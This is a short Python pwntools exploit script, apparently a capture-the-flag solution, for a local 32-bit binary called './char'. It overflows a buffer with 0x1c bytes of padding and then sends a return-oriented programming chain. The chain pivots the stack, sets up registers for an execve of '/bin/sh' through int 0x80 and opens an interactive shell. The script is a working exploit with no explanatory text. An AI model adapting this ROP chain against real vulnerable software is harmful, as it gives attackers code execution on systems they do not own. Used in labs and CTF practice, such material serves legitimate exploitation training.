#coding:utf-8

from pwn import *

p = process('./char')
context(os='linux',arch='i386')
#context.log_level = 'debug'

p.recvuntil('GO : ) \n')

base = 0x5555e000
sh_addr = 0x15D7EC
#pop_ebx = 0x109D07 
xor_eax_pop_ebx = 0x7dce9
pop_ecx = 0xcae3b
pop_edx = 0x1a9e
int_0x80 = 0x2df35
inc_eax = 0x26a9b
nop_xor_eax = 0x7403a
xchg_eax_esp_retb = 0xe6d62
mov_eax_ecx = 0x148253

payload = 'a'*0x1c
payload+= p32(mov_eax_ecx+base)  
payload+= p32(mov_eax_ecx+base)
payload+= p32(xchg_eax_esp_retb+base)
payload+= '\x00'*3
payload+= p32(xor_eax_pop_ebx+base)
payload+= p32(sh_addr+base)
payload+= p32(pop_ecx+base)
payload+= p32(0)
payload+= p32(pop_edx+base)
payload+= p32(0)
#payload+= p32(nop_xor_eax+base)
for i in range(11):
	payload+= p32(inc_eax+base)
payload+= p32(int_0x80+base)

pause()
#gdb.attach(p)
p.sendline(payload)

p.interactive()
